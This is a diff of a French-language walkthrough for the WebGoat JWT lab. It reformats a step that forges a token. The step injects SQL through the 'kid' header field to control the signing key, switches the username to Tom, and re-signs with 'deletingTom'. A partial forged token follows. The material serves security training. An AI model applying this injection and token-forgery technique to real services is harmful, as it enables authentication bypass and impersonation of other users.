@@ -519,7 +519,18 @@ zOU638uUCi6UhiOJKYzoEZGE8
 "iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com",
 "username":"Jerry","Email":"jerry@webgoat.com","Role":["Cat"]}.signature
 ```
-*   Modifier les deux premières parties du token en `{"typ":"JWT","kid":"hacked' UNION select 'ZGVsZXRpbmdUb20=' from INFORMATION_SCHEMA.SYSTEM_USERS --","alg":"HS256"}` et `{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Tom","Email":"jerry@webgoat.com","Role":["Cat"]}`, puis recalculer la signature avec la clé `deletingTom`, avec le script Python ci-dessous par exemple.
+*   Modifier les deux premières parties du token en 
+```
+{"typ":"JWT","kid":"hacked' UNION select 'ZGVsZXRpbmdUb20=' from 
+INFORMATION_SCHEMA.SYSTEM_USERS --","alg":"HS256"}
+``` 
+et 
+```
+{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,
+"aud":"webgoat.org","sub":"jerry@webgoat.com","username":"Tom",
+"Email":"jerry@webgoat.com","Role":["Cat"]}
+```, 
+puis recalculer la signature avec la clé `deletingTom`, avec le script Python ci-dessous par exemple.
 *   Le nouveau token est :
 ```
 eyJ0eXAiOiJKV1QiLCJraWQiOiJoYWNrZWQnIFVOSU9OIHNlbGVjdCAnWkdWc1pYUnBibWRVYjIwPScg
